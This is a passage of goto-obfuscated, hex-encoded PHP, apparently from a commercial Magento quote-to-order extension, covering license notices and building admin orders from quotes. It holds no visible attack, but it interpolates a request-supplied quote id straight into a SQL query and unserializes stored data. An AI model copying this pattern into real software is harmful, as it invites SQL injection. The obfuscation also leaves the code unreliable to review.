bZKRt; bZKRt: $CFVXR .= "\40\x20\40\40\74\x2f\144\151\166\76"; goto F1NwY; p5Sxi: $P_7YZ = now(); goto lSltH; SrQPW: $CFVXR .= "\x20\40\40\74\x64\x69\166\76"; goto EZKZ6; LtWEN: $YLroU = $this->__(Mage::helper("\x71\x71\x75\157\x74\145\141\144\166\x2f\x6c\151\x63\x65\x6e\x73\x65\143\150\145\x63\x6b\x73")->x7pVY, $iVYxS); goto lRdvx; i0Uz2: KdD5h: goto cAzBL; aKQuY: $CFVXR .= "\40\x20\40\74\144\x69\166\x20\143\154\x61\x73\163\x3d\x22\x73\x6d\x61\154\x6c\x70\162\x69\x6e\x74\x22\x20\x3e" . $eeFn6 . "\x3c\x2f\144\x69\x76\76"; goto rVgcu; rpgV0: $GKV2j = "\x3c\x64\x69\x76\40\x63\154\x61\x73\163\x3d\42\143\x32\161\x2d\141\x63\x74\151\166\x61\x74\145\55\160\157\160\x75\160\42\x3e"; goto Dhgrv; U8dU9: $eeFn6 = $this->__("\74\x61\40\x68\162\x65\146\75\42\x68\x74\x74\x70\163\x3a\x2f\x2f\x77\x77\167\x2e\143\141\162\x74\62\161\x75\157\164\145\56\143\x6f\x6d\57\x6f\162\144\x65\x72\x69\156\147\55\154\151\x63\145\156\x73\145\163\77\165\x74\155\137\163\157\165\162\x63\145\x3d\103\x6c\151\x65\x6e\x74\x5f\x57\145\x62\x73\x69\164\x65\46\x75\x74\155\137\x6d\145\144\151\x75\x6d\75\x50\157\160\x75\x70\x5f\167\x72\157\x6e\147\x4c\151\143\x65\x6e\163\145\x54\145\170\164\x26\165\164\x6d\x5f\143\x61\x6d\160\x61\151\x67\156\x3d\103\154\151\145\x6e\x74\137\127\145\x62\x73\151\x74\x65\x5f\125\160\x67\x72\141\x64\x65\x22\x20\x63\x6c\x61\x73\x73\75\x22\163\x75\x62\x6c\x69\x6e\153\x42\x6f\164\x74\157\155\42\x3e\162\x65\x61\144\40\x6d\x6f\162\x65\40\x61\x62\157\165\164\x20\154\x69\143\145\156\x73\x69\x6e\147\x3c\57\141\76"); goto fWNSL; m4NWO: $r2r72 = $this->__("\114\x69\x63\x65\x6e\163\x65\x20\116\x6f\x74\151\143\145"); goto rpgV0; cAzBL: $dgNOC = Mage::helper("\x71\x71\x75\157\164\x65\141\144\166\x2f\x6c\x69\x63\x65\156\163\x65")->getC2QExpiryDate(); goto y3Y71; iO7w8: $CFVXR .= $GKV2j; goto SrQPW; hblkb: goto oKOBj; goto SpPJI; NJqVV: ASWE6: goto NeSRu; XLmKg: $HDp_R = "\x3c\142\165\x74\x74\x6f\x6e\40\164\141\x72\147\145\164\x3d\x22\x5f\142\154\141\156\153\42\40\x66\x6f\162\x6d\164\x61\162\147\145\164\x3d\x22\x5f\x62\154\x61\156\x6b\x22\x20\143\x6c\x61\163\x73\x3d\x22\x62\165\164\x74\x6f\x6e\x20\142\165\x74\x74\157\x6e\x32\x20\142\x74\x6e\55\x70\162\151\x6d\42\40\x74\x69\164\154\x65\75\x22\x45\144\151\164\x69\157\156\x73\x20\x61\156\x64\40\120\162\151\143\x69\x6e\x67\42\x20\157\x6e\143\x6c\x69\143\153\75\x22\144\x6f\x63\x75\x6d\145\x6e\x74\56\x6c\x6f\x63\x61\x74\x69\157\x6e\x2e\x68\162\145\146\75\47\x68\164\164\160\163\x3a\x2f\57\x77\x77\167\x2e\x63\141\162\164\x32\161\165\157\x74\x65\x2e\x63\157\155\57\155\x61\147\145\x6e\164\157\x2d\161\x75\x6f\x74\x61\164\151\x6f\156\55\155\x6f\144\165\154\145\55\160\154\141\156\x73\55\160\162\x69\x63\151\156\x67\56\x68\164\155\154\x27\42\x3e" . $this->__("\105\x64\151\x74\151\x6f\x6e\x73\40\x61\156\144\40\x50\162\151\143\x69\156\147") . "\74\x2f\x62\165\164\164\x6f\x6e\x3e\x20"; goto l3wd9; NgX_a: $CFVXR .= $HDp_R; goto NuSSj; ucb8M: return ''; goto NJqVV; KTqcb: $GKV2j = "\x3c\144\x69\x76\x20\x63\x6c\x61\163\163\75\x22\x63\62\x71\55\141\143\x74\151\x76\141\164\x65\55\x70\x6f\160\165\160\x22\x3e"; goto D_og7; V1Pvb: kV1mv: goto fWtKS; lSltH: $dgNOC = substr($dgNOC, 0, 552/138) . "\x2d" . substr($dgNOC, 1240/310, 1202/601) . "\55" . substr($dgNOC, 3696/616, 1550/775); goto wUIoL; dmw3d: } private final function QxAac($RHhyg) { return Mage::helper("\x71\161\165\157\x74\x65\141\144\x76\57\154\x69\x63\145\156\x73\x65")->checkQuoteLicense($RHhyg); } private final function XdgON($OpJs6 = null) { return Mage::helper("\x71\x71\x75\157\x74\145\x61\144\166\57\x6c\x69\x63\x65\x6e\x73\145")->getAccessLevel($OpJs6); } private final function BDJ1g() { return Mage::helper("\161\161\165\157\164\x65\x61\x64\166\x2f\154\x69\x63\145\156\163\x65")->hasExpired(); } protected function _getSession() { return Mage::getSingleton("\141\x64\x6d\151\156\x68\x74\x6d\154\57\163\x65\163\x73\x69\x6f\156\137\161\x75\x6f\x74\x65"); } protected function _getOrderCreateModel() { return Mage::getSingleton("\x61\144\x6d\x69\156\x68\164\x6d\154\x2f\163\141\x6c\x65\163\137\x6f\x72\144\145\x72\137\x63\x72\x65\141\x74\x65"); } protected function _convertQuoteItemsToOrder($Ia31n, $Ki7DR) { goto j2h8b; j2h8b: $KV2EA = Mage::getSingleton("\x63\157\x72\145\x2f\x72\145\163\x6f\165\162\x63\145"); goto yDKEP; lXk7H: XCvY7: goto wMekz; wFiSp: RDBUp: goto N4QVX; wMekz: $naxnU = implode("\x2c", $WmnB5); goto GpqNf; YMTNi: $WmnB5 = []; goto AnYr7; dvhG0: $gaZgo = $KV2EA->getTableName("\x71\165\x6f\x74\145\x61\144\x76\x5f\x70\x72\157\144\x75\143\x74"); goto A3KK6; TcWns: $xOx3u = $R9_0j->fetchAll($SvVGD); goto AmH0A; AnYr7: foreach ($Ki7DR as $gfR31 => $ILNsH) { $WmnB5[$gfR31] = intval($ILNsH); dGjn8: } goto lXk7H; yDKEP: $R9_0j = $KV2EA->getConnection("\x63\x6f\x72\145\x5f\162\x65\x61\x64"); goto dvhG0; f9HCK: return; goto rqbqR; xWicV: $SvVGD .= "\x20\117\122\x44\x45\122\40\102\x59\x20\x70\x2e\x73\x6f\162\164\x5f\157\162\144\x65\x72\40\101\123\103"; goto yGU_S; rqbqR: goto WjBVY; goto KT_t1; Dg5Go: if (count($Ki7DR)) { goto fS0_8; } goto f9HCK; AmH0A: foreach ($xOx3u as $QbRw5) { goto sy5j2; So7WR: Mage::log("\115\145\x73\x73\141\x67\145\72\x20" . $WzFf2, null, "\x63\62\x71\56\x6c\157\147"); goto gLmOe; ts_is: $OJXHM->setCustomer($ZXeg2); goto eUmSH; doiTz: $OJXHM->setCustomer($ZXeg2); goto UD57x; LIRqS: $AlP22 = Mage::helper("\164\141\x78")->priceIncludesTax($GOqOp); goto v_evt; uMsl6: $NL9ym = $QbRw5["\157\167\156\x65\162\137\x63\165\x72\x5f\160\162\x69\143\145"]; goto E3bK5; dPmls: WY5DM: goto E83wa; II2GW: $y73fm = Mage::getModel("\x63\157\162\145\57\163\164\157\162\x65")->load($GOqOp); goto sWsxq; wUKMn: $SeGNy = $c3RCn->getTaxClassId(); goto ZE_cQ; ZVuwi: goto rxHq0; goto dPmls; PcMBa: if (!($R6f9I != $OpphN)) { goto q1Shf; } goto Re30I; equrQ: $lwkUi = Mage::app()->getStore("\x64\x65\146\141\165\x6c\164"); goto F3vY3; E3bK5: $g6Kqk = $this->getQuotationQuote($Ia31n); goto fdO5m; ZE_cQ: $OpphN = $OJXHM->getRate($iXSSh->setProductClassId($SeGNy)); goto PcMBa; VfG3f: Mage::register("\x63\165\x73\164\x6f\x6d\120\x72\x69\143\x65", $NL9ym); goto W2_pN; fs4xs: $ZXeg2 = $g6Kqk->getCustomer(); goto ZzylI; rayNB: $R6f9I = $OJXHM->getRate($iXSSh->setProductClassId($SeGNy)); goto II2GW; sWsxq: $OJXHM = Mage::getModel("\164\x61\170\57\x63\141\x6c\x63\x75\x6c\x61\x74\151\157\156"); goto fs4xs; ZzylI: if (!$ZXeg2) { goto Eqyqz; } goto ts_is; UcQmL: C2QkQ: goto VfG3f; f31zr: if (!$ZXeg2) { goto Hohbx; } goto doiTz; SOf40: $lwkUi = Mage::app()->getWebsite(true)->getDefaultGroup()->getDefaultStore(); goto kv22n; EWt6h: rxHq0: goto yzxq2; JHEfr: $UMVVR[$sRb87] = @unserialize($QbRw5["\141\164\164\162\x69\142\165\x74\x65"]); goto W6cta; fD69y: $BhWOR["\x71\x74\x79"] = (float) $QbRw5["\x72\x65\x71\x75\145\163\164\137\161\x74\171"]; goto Kf8My; Fm8_2: if (is_object(Mage::app()->getWebsite(true))) { goto V_zAR; } goto equrQ; OlnSB: FFU09: goto robqm; g8zht: $ZXeg2 = $g6Kqk->getCustomer(); goto f31zr; gkF9b: $SeGNy = $c3RCn->getTaxClassId(); goto rayNB; lNqXY: $this->_getOrderCreateModel()->addProducts($UMVVR); goto EWt6h; YZ0ZV: $iXSSh = $OJXHM->getRateOriginRequest($y73fm); goto wUKMn; fdO5m: $GOqOp = $g6Kqk->getStoreId(); goto LIRqS; Re30I: $NL9ym = $NL9ym / (60600/606 + $OpphN) * (25800/258 + $R6f9I); goto MjaHD; UD57x: Hohbx: goto Z5SUt; F3vY3: $WzFf2 = "\x4d\x61\x67\x65\72\x3a\x61\160\160\50\51\x2d\76\147\x65\164\127\x65\x62\163\151\x74\145\x28\164\x72\x75\x65\x29\40\151\x73\x20\x6e\157\164\x20\x61\x20\x6f\x62\x6a\145\143\x74\54\40\x66\x61\154\154\142\141\x63\153\x20\x61\160\x70\154\x69\x65\x64"; goto So7WR; Kf8My: try { $BhWOR = Mage::helper("\161\161\x75\x6f\x74\145\x61\x64\166")->prepareFileOptions($BhWOR); $this->_getOrderCreateModel()->addProduct($c3RCn, $BhWOR); } catch (Exception $Zf0h2) { Mage::log("\x45\170\143\x65\x70\164\x69\x6f\x6e\x3a\40" . $Zf0h2->getMessage(), null, "\x63\x32\x71\137\x65\x78\143\145\160\x74\151\x6f\x6e\56\x6c\x6f\x67", true); } goto ZVuwi; G84kn: $c3RCn = Mage::getModel("\143\x61\x74\x61\154\157\147\57\x70\162\x6f\x64\x75\143\x74")->load($sRb87); goto uMsl6; W6cta: $UMVVR[$sRb87]["\x71\x74\x79"] = (float) $QbRw5["\162\145\161\x75\x65\163\164\137\x71\x74\x79"]; goto lNqXY; gLmOe: goto u06Qw; goto n5dAW; v_evt: if (!$AlP22) { goto C2QkQ; } goto Fm8_2; Z5SUt: $iXSSh = $OJXHM->getRateOriginRequest($lwkUi); goto gkF9b; sy5j2: $sRb87 = $QbRw5["\x70\x72\x6f\144\165\143\x74\x5f\151\144"]; goto G84kn; lbmaL: $BhWOR = @unserialize($QbRw5["\x61\164\164\x72\151\142\165\x74\x65"]); goto fD69y; E83wa: $UMVVR = []; goto JHEfr; W2_pN: if ($c3RCn->getTypeId() == Mage_Catalog_Model_Product_Type::TYPE_BUNDLE) { goto WY5DM; } goto lbmaL; yzxq2: Mage::unregister("\143\165\163\x74\x6f\x6d\120\x72\x69\143\x65"); goto OlnSB; XnLrX: $OJXHM = Mage::getModel("\x74\x61\x78\x2f\x63\x61\154\143\x75\154\141\164\x69\x6f\156"); goto g8zht; eUmSH: Eqyqz: goto YZ0ZV; n5dAW: V_zAR: goto SOf40; MjaHD: q1Shf: goto UcQmL; kv22n: u06Qw: goto XnLrX; robqm: } goto wFiSp; KT_t1: fS0_8: goto YMTNi; NrbPM: $SvVGD = "\123\x45\x4c\105\x43\124\40\x2a\x20\12\40\40\x20\40\40\x20\40\40\x20\40\x20\40\x20\40\40\x20\x46\122\117\x4d\x20{$gaZgo}\x20\x70\x20\xa\x20\x20\x20\40\40\x20\x20\x20\40\40\x20\x20\40\x20\x20\40\x49\116\116\x45\122\40\112\x4f\x49\116\x20{$pQ9l9}\40\151\12\x20\x20\40\40\40\40\x20\x20\40\40\40\x20\40\x20\x20\x20\40\x20\117\116\40\x70\x2e\161\165\157\x74\145\x5f\151\x64\75\151\x2e\161\x75\157\x74\145\137\151\144\x20\12\40\40\40\40\x20\x20\40\40\40\x20\40\40\40\x20\x20\x20\x20\x20\101\x4e\104\x20\151\56\161\165\x6f\x74\x65\x61\144\x76\x5f\x70\x72\x6f\144\x75\x63\x74\x5f\x69\144\x3d\x70\56\x69\x64\xa\40\x20\40\40\40\40\40\x20\x20\40\40\x20\40\40\40\x20\x20\x20\x41\116\x44\40\x70\56\x71\x75\157\x74\x65\x5f\x69\x64\75{$Ia31n}"; goto Dg5Go; A3KK6: $pQ9l9 = $KV2EA->getTableName("\x71\165\x6f\x74\145\x61\x64\166\x5f\162\145\161\x75\x65\163\164\x5f\151\x74\x65\155"); goto NrbPM; yGU_S: WjBVY: goto TcWns; GpqNf: $SvVGD .= "\40\x41\116\104\40\x69\x2e\x72\145\x71\165\x65\163\x74\137\x69\144\40\111\116\50{$naxnU}\51"; goto xWicV; N4QVX: } public function requestArticleAction() { echo Mage::helper("\161\x71\x75\x6f\164\145\x61\x64\x76")->executeArticleRequest(); } public function convertAction() { goto HcYoG; ZjCQc: $t7rkQ = (int) $FsnNf->getCustomerGroupId(); goto jQpXg; TeWbM: Mage::helper("\161\161\x75\x6f\164\145\x61\144\166\57\154\x6f\147\x67\x69\156\147")->sentAnonymousData("\x63\157\x6e\x66\x69\x72\155", "\x62", $Ia31n); goto Uzf_x; wZZMr: ZKIk2: goto rcpV4; Z45RJ: foreach ($Ki7DR as $nLCD0 => $ohESd) { goto cR2Rl; TXQvt: unset($Ki7DR[$nLCD0]); goto tec3D; cR2Rl: if (!empty($ohESd)) { goto DJA24; } goto TXQvt; vHleu: VhgWB: goto ozQUK; tec3D: DJA24: goto vHleu; ozQUK: } goto HPtQ7; Uzf_x: $XzQBI = $this->getUrl("\141\144\x6d\x69\x6e\150\x74\155\x6c\57\163\x61\154\x65\163\137\157\x72\x64\x65\x72\x5f\x63\162\145\141\x74\145\57\x69\156\144\145\170"); goto U_wnU; NukmH: $this->_getOrderCreateModel()->applyCoupon($FsnNf->getCouponCodeById($FsnNf->getData("\163\141\154\145\x73\162\165\154\x65"))); goto wZZMr; WslIr: $Ki7DR = $this->getRequest()->getParam("\x71\x32\157\x5f\163\x65\x72\151\141\154"); goto mDkRW; U8yky: $this->_getOrderCreateModel()->initRuleData()->saveQuote(); goto Dng2r; mDt9I: $this->_getOrderCreateModel()->getQuote()->getShippingAddress()->setData("\163\141\155\145\137\141\x73\137\x62\151\x6c\x6c\151\x6e\x67", 562/562); goto b5AIV; agamU: return; goto nBs87; IowjO: C5Lzq: goto vIsvx; mDkRW: if (empty($Ki7DR)) { goto aKHgA; } goto BlS5K; mHSPK: $aMYKO = $FsnNf->getData("\143\x75\x72\162\145\x6e\143\171"); goto PInK6; QJ2zO: Mage::dispatchEvent("\x6f\160\150\151\x72\141\150\x5f\161\x71\165\x6f\x74\x65\x61\144\x76\x5f\141\x64\155\x69\x6e\x5f\143\157\156\x76\145\162\x74\x5f\x61\146\164\x65\162", [$Ia31n, $Ki7DR]); goto jcD82; qm6Lp: $this->_convertQuoteItemsToOrder($Ia31n, $Ki7DR); goto jXHhY; Hzt01: $ZXeg2 = Mage::getModel("\x63\165\163\x74\157\x6d\145\x72\57\143\165\x73\x74\x6f\155\145\x72")->load($EY6wb); goto mqri7; OyLF8: try { goto q91_7; PcHrZ: $OxvQc = $FsnNf->getShippingMethod(); goto BJp__; GyHUx: if (!(isset($OxvQc) && !empty($OxvQc))) { goto tNyNP; } goto gWLIq; BJp__: Ep9Jx: goto GyHUx; q91_7: $OxvQc = $FsnNf->getShippingCode(); goto HcOMV; numD8: rn2Ru: goto WRJ_P; WRJ_P: tNyNP: goto htzRi; gWLIq: $K6Xwe = Mage::getSingleton("\x73\150\151\160\x70\151\156\147\57\x63\x6f\x6e\x66\151\x67")->getActiveCarriers(); goto Mnk8D; HcOMV: if (!empty($OxvQc)) { goto Ep9Jx; } goto PcHrZ; Mnk8D: foreach ($K6Xwe as $FjbML => $F_M_j) { goto bDMYq; in15Q: foreach ($fXUMZ as $ierSy => $DG8ij) { goto Kik_o; alAYV: goto QMBAR; goto EU6Ot; EU6Ot: LZQey: goto PjRNk; tfMN3: $this->_getOrderCreateModel()->setShippingMethod($OxvQc); goto rfEJs; Kik_o: $GuAaV = $FjbML . "\137" . $ierSy; goto iIkrQ; iIkrQ: if (!($GuAaV == $OxvQc)) { goto LZQey; } goto tfMN3; PjRNk: FtYgV: goto a_rU8; rfEJs: $this->_getOrderCreateModel()->getShippingAddress()->requestShippingRates(); goto alAYV; a_rU8: } goto ekTcK; OnJ2A: itx8L: goto MZu9a; ekTcK: QMBAR: goto VoaYx; bDMYq: $fXUMZ = $F_M_j->getAllowedMethods(); goto ckIXn; VoaYx: bKfe7: goto OnJ2A; ckIXn: if (!$fXUMZ) { goto bKfe7; } goto in15Q; MZu9a: } goto numD8; htzRi: } catch (Exception $Zf0h2) { Mage::log("\105\170\x63\145\160\164\x69\157\x6e\72\40" . $Zf0h2->getMessage(), null, "\x63\x32\161\x5f\x65\x78\143\145\x70\164\151\157\156\x2e\x6c\x6f\x67", true); } goto plwuB; E7Smx: Mage::dispatchEvent("\161\161\x75\x6f\164\145\x61\144\166\137\161\161\x61\144\x76\143\165\163\x74\x6f\155\145\x72\137\142\145\146\x6f\162\145\x5f\x63\157\x6e\166\145\162\164", ["\161\x75\x6f\x74\145" => $FsnNf, "\162\145\161\x75\145\163\164\x49\x74\145\155\163" => $Ki7DR]); goto mHSPK; iq583: R5zTF: goto zMbq5; yNIgo: Mage::dispatchEvent("\x6f\160\x68\151\162\x61\150\137\161\161\x75\157\x74\x65\x61\144\166\137\141\144\155\x69\156\x5f\x63\157\156\166\x65\x72\164\137\142\x65\x66\157\162\145", [$Ia31n, $Ki7DR]); goto a5Ws7; g01Uu: Mage::getSingleton("\141\x64\x6d\151\x6e\150\164\155\154\57\x73\145\163\x73\x69\157\x6e")->addError($CFVXR); goto yPtaB; q75SL: if (!$Ki7DR) { goto OKUjd; } goto Z45RJ; U_wnU: $this->_redirectUrl($XzQBI); goto k4q7D; fyTXT: Mage::getSingleton("\143\x6f\162\x65\57\163\x65\163\x73\x69\x6f\156")->tDErD = $Ia31n; goto gTzDe; a5Ws7: if (!empty($Ki7DR)) { goto Zhzr9; } goto WslIr; mqri7: $this->_getSession()->setCustomerId($EY6wb); goto vfBcH; qn4Ns: $this->_getOrderCreateModel()->getQuote()->getShippingAddress()->setData("\x63\157\154\154\x65\143\x74\137\163\x68\151\x70\x70\151\156\147\x5f\x72\x61\x74\145\x73", "\x31"); goto yJDs_; Wp49y: goto V2f4O; goto ome2R; wa4fi: Zhzr9: goto q75SL; b5AIV: goto R5zTF; goto vPmdj; GbkCq: $n99lh = $this->_getOrderCreateModel()->getQuote()->getData("\x65\x6e\164\151\x74\x79\137\151\x64"); goto sOAgI; UZEw6: $EY6wb = (int) $FsnNf->getCustomerId(); goto Hzt01; nN_cn: $this->_redirect("\x2a\x2f\x2a"); goto agamU; PInK6: $RHhyg = $FsnNf->getStoreId(); goto cggL8; rcpV4: if (!($FsnNf->getAddress()->getShippingMethod() !== null && (int) $FsnNf->getData("\163\150\151\160\x70\151\156\x67\x5f\164\171\x70\x65"))) { goto Jy8Wg; } goto CY1rj; AqBgO: DsCDM: goto Wp49y; ckkg8: if (!($FsnNf->getData("\163\x61\154\x65\163\x72\165\x6c\145") > 0)) { goto ZKIk2; } goto NukmH; rzQv9: $Tzzz8 = $VpbLO->buildQuoteAdresses($FsnNf); goto vO6D6; tISvt: $this->_getOrderCreateModel()->getQuote()->getShippingAddress()->setData("\x73\141\x6d\x65\x5f\x61\x73\x5f\142\x69\154\154\151\x6e\147", 0); goto iq583; fDVnn: $this->_redirectUrl($XzQBI); goto naDWC; Pp55C: kpKaH: goto QJ2zO; HcYoG: $Ia31n = $this->getRequest()->getParam("\151\144"); goto axV5u; PMeAK: fo5AW: goto ZmDhm; mwbdk: $CFVXR = $this->__("\124\x6f\x20\143\x72\x65\141\x74\x65\x20\x61\x6e\40\157\162\x64\x65\162\x2c\40\x73\x65\x6c\x65\x63\164\x20\x70\x72\x6f\x64\x75\x63\164\50\x73\x29\x20\141\156\144\x20\x71\x75\141\x6e\164\151\164\x79"); goto g01Uu; FJm73: $VpbLO = Mage::helper("\161\x71\165\x6f\164\145\141\144\x76\x2f\x61\144\144\162\x65\163\163"); goto rzQv9; k4q7D: return; goto Pp55C; ome2R: KMLoH: goto O7U7T; qRFSB: oweYl: goto ckkg8; jQpXg: $this->_getOrderCreateModel()->getQuote()->setCustomerGroupId($t7rkQ); goto lwKT4; lwKT4: $FLYS9 = (int) $FsnNf->getData("\143\x75\x73\164\x6f\x6d\145\x72\137\164\x61\170\x5f\143\154\141\x73\163\137\151\x64"); goto tuyYr; OsYRD: OKUjd: goto v6uu8; vPmdj: TWR2y: goto tISvt; Yi7b6: $this->_getOrderCreateModel()->getQuote()->setCustomerTaxClassId($FLYS9); goto qRFSB; S47Gr: $this->_redirect("\52\57\x2a"); goto UKPPO; v6uu8: if (!empty($Ia31n)) { goto fo5AW; } goto S47Gr; UKPPO: goto kpKaH; goto PMeAK; naDWC: return; goto AqBgO; O7U7T: Mage::helper("\161\x71\x75\157\x74\x65\x61\x64\x76")->setCurrentCurrency($aMYKO); goto qm6Lp; Dng2r: $this->_getOrderCreateModel()->getSession()->setCurrencyId($aMYKO); goto km3Q9; sOAgI: Mage::helper("\x71\x71\x75\x6f\x74\145\141\x64\x76")->setReferenceIdInCoreSession($n99lh, $Ia31n); goto U8yky; vfBcH: $this->_getOrderCreateModel()->getQuote()->removeAllItems(); goto FJm73; lvYdY: if (count($Ki7DR)) { goto KMLoH; } goto mwbdk; CnMp2: if ($Tzzz8["\x62\x69\x6c\154\151\156\x67\x41\144\144\x72\145\x73\x73"] != $Tzzz8["\x73\150\x69\x70\x70\151\156\147\x41\144\144\162\x65\x73\163"]) { goto TWR2y; } goto mDt9I; XzpVa: $this->_getOrderCreateModel()->getQuote()->setShippingAddress($VpbLO->getQuoteAddress($ZXeg2, $Tzzz8["\163\x68\151\x70\160\151\156\147\101\144\144\162\145\163\x73"], $RHhyg, Mage_Customer_Model_Address_Abstract::TYPE_SHIPPING)); goto CnMp2; CeuUg: aKHgA: goto wa4fi; yPtaB: if (isset($_SERVER["\x48\x54\124\120\x5f\122\x45\x46\x45\x52\x45\x52"])) { goto C5Lzq; } goto nN_cn; CY1rj: $this->_getOrderCreateModel()->getQuote()->getShippingAddress()->setData("\163\150\151\160\160\x69\x6e\x67\x5f\x6d\x65\x74\150\157\144", $FsnNf->getAddress()->getData("\163\x68\x69\x70\160\x69\156\147\x5f\x6d\x65\164\150\157\144")); goto qn4Ns; ZmDhm: $FsnNf = $this->getQuotationQuote($Ia31n); goto E7Smx; yJDs_: Jy8Wg: goto lvYdY; tuyYr: if (!$FLYS9) { goto oweYl; } goto Yi7b6; vO6D6: $this->_getOrderCreateModel()->getQuote()->setBillingAddress($VpbLO->getQuoteAddress($ZXeg2, $Tzzz8["\x62\x69\x6c\154\151\x6e\x67\101\x64\x64\162\145\163\163"], $RHhyg, Mage_Customer_Model_Address_Abstract::TYPE_BILLING)); goto XzpVa; HPtQ7: MUi0q: goto OsYRD; cggL8: $this->_getSession()->setStoreId((int) $RHhyg); goto UZEw6; axV5u: $Ki7DR = $this->getRequest()->getParam("\161\62\x6f"); goto yNIgo; nBs87: goto DsCDM; goto IowjO; km3Q9: Mage::dispatchEvent("\x71\x71\x75\x6f\x74\145\x61\144\166\x5f\161\x71\141\144\166\143\x75\163\164\x6f\x6d\x65\x72\x5f\141\146\164\145\162\x5f\143\x6f\x6e\166\145\162\164", ["\157\162\x64\x65\x72\x43\x72\x65\x61\164\x65\115\x6f\x64\145\x6c" => $this->_getOrderCreateModel()]); goto TeWbM; gTzDe: $this->_getOrderCreateModel()->getQuote()->setProposalQuoteId($Ia31n); goto OyLF8; zMbq5: $this->_getOrderCreateModel()->getQuote()->setCustomerId($EY6wb); goto ZjCQc; VbyWG: V2f4O: goto fyTXT; BlS5K: $Ki7DR = json_decode(base64_decode($Ki7DR)); goto CeuUg; plwuB: try { goto XQMFY; Y7Zv_: if (!(isset($jfxuj) && !empty($jfxuj))) { goto T4pO6; } goto BWy6C; n3KFD: goto vUfNm; goto LTDom; xvINS: vUfNm: goto p2y0r; zuIDO: $O8EjY = $voW2L->getData(); goto F6vfK; KdxzM: OU2E0: goto xvINS; Lra6l: $gkTHA = $FsnNf->getPaymentMethod(); goto jFL2O; jFL2O: if (!(isset($gkTHA) && !empty($gkTHA))) { goto vnSZN; } goto bX7hx; VZKOC: $this->_getOrderCreateModel()->setPaymentData($O8EjY); goto KdxzM; LTDom: or0Cs: goto zuIDO; BWy6C: $voW2L = Mage::getModel("\163\141\154\145\x73\x2f\161\x75\x6f\164\x65\137\x70\141\x79\155\145\156\164")->getCollection()->setQuoteFilter($jfxuj)->getFirstItem(); goto YQmXu; XQMFY: $jfxuj = $FsnNf->getCreatedFromQuoteId(); goto Y7Zv_; F6vfK: if (empty($O8EjY)) { goto OU2E0; } goto VZKOC; st3rn: vnSZN: goto n3KFD; p2y0r: T4pO6: goto k7KTB; bX7hx: $this->_getOrderCreateModel()->setPaymentMethod($gkTHA); goto st3rn; YQmXu: if (isset($voW2L) && !empty($voW2L)) { goto or0Cs; } goto Lra6l; k7KTB: } catch (Exception $Zf0h2) { goto pxD6g; okThb: $this->_getOrderCreateModel()->getQuote()->removePayment(); goto THcDA; pxD6g: Mage::log("\105\170\x63\145\x70\164\151\x6f\156\72\40" . $Zf0h2->getMessage(), null, "\x63\62\x71\x5f\x65\170\143\x65\160\164\x69\x6f\x6e\56\x6c\157\x67", true); goto fsMO8; fsMO8: $this->_getOrderCreateModel()->getQuote()->getPayment()->unsetData("\x6d\x65\x74\150\157\144"); goto okThb; THcDA: } goto GbkCq; vIsvx: $XzQBI = $_SERVER["\110\124\124\x50\x5f\x52\105\106\x45\122\x45\122"]; goto fDVnn; jXHhY: Mage::getSingleton("\141\144\155\151\x6e\x68\x74\155\x6c\57\163\x65\163\x73\x69\x6f\156")->setUpdateQuoteId($Ia31n); goto VbyWG; jcD82: } protected function _redirectErr($HYkyg, $XzQBI = null) { goto rYBSK; b52OI: hcx8l: goto v98l1; v98l1: Ke6MB: goto BJglF; zgsg3: $this->_redirectUrl($XzQBI); goto b52OI; NYjR1: $XzQBI = $_SERVER["\x48\x54\x54\120\137\122\x45\106\x45\122\105\x52"]; goto rhvkL; rYBSK: if (!is_string($HYkyg)) { goto EtIle; } goto WZk2M; WZk2M: $HYkyg = [$HYkyg]; goto lNI1r; zj7uZ: if (!isset($_SERVER["\x48\124\124\x50\x5f\122\x45\x46\x45\x52\105\122"])) { goto Hwam0; } goto NYjR1; lNI1r: EtIle: goto w5k9v; X070l: $this->_redirect("\52\57\52"); goto j8nzO; NidZk: J3mGS: goto omPSA; j8nzO: goto hcx8l; goto LM9bQ; A2hac: if ($XzQBI != null) { goto pyKo0; } goto X070l; omPSA: if (!($XzQBI == null)) { goto IbvfS; } goto zj7uZ; rlDky: foreach ($HYkyg as $CFVXR) { Mage::getSingleton("\141\x64\155\x69\x6e\150\164\x6d\154\x2f\x73\x65\163\x73\151\157\156")->addError($CFVXR); s9rKa: } goto NidZk; w5k9v: if (!count($HYkyg)) { goto Ke6MB; } goto rlDky; QRVdr: IbvfS: goto A2hac; rhvkL: Hwam0: goto QRVdr; LM9bQ: pyKo0: goto zgsg3; BJglF: } protected function _saveCustomerAfterQuote($OLseV) { goto WhXhR; fUXbT: $ZXeg2->setFirstname($qLNg0["\x66\151\162\163\164\x6e\141\x6d\145"]); goto WqU1D; WqU1D: $ZXeg2->setLastname($qLNg0["\154\141\x73\x74\156\141\x6d\x65"]); goto qVrCm; kEqP4: $ZXeg2->setData($OLseV->getCustomer()->getData()); goto wtBkR; ieTx0: Kq2qC: goto v1yGl; W0jXA: $qLNg0 = $OLseV->getBillingAddress()->exportCustomerAddress()->getData(); goto q_0Mr; t6EII: $lwkUi = $OLseV->getStore(); goto W0jXA; tSJGJ: $ZXeg2->setStore($lwkUi); goto m0uk0; WhXhR: $ZXeg2 = $OLseV->getCustomer(); goto t6EII; q_0Mr: if ($OLseV->getCustomer()->getId()) { goto Kq2qC; } goto svC15; G_ysv: $ZXeg2->setGroupId($OLseV->getData("\x63\x75\x73\x74\x6f\x6d\145\162\x5f\147\162\157\165\x70\x5f\x69\144")); goto fUXbT; svC15: $ZXeg2 = Mage::getModel("\161\x71\x75\157\164\x65\x61\x64\x76\x2f\143\x75\x73\164\x6f\155\145\162\137\x63\165\163\x74\157\155\145\162"); goto kEqP4; wtBkR: $ZXeg2->setPassword($ZXeg2->generatePassword()); goto tSJGJ; qVrCm: try { goto PjEIR; l81Pk: $ZXeg2->sendNewQuoteAccountEmail("\x72\145\147\x69\163\x74\145\x72\x65\144", '', $ZXeg2->getStoreId()); goto kf4CK; wRauy: $ZXeg2->save(); goto iKsiI; iKsiI: Mage::dispatchEvent("\161\x71\x75\x6f\164\145\141\x64\166\x5f\161\161\x61\x64\166\143\165\x73\164\x6f\155\145\162\x5f\x61\146\164\x65\162\137\x6e\145\167\x43\165\163\164\157\x6d\145\162", ["\x63\165\x73\164\x6f\155\145\x72" => $ZXeg2, "\x71\165\157\x74\x65" => $OLseV]); goto l81Pk; PjEIR: 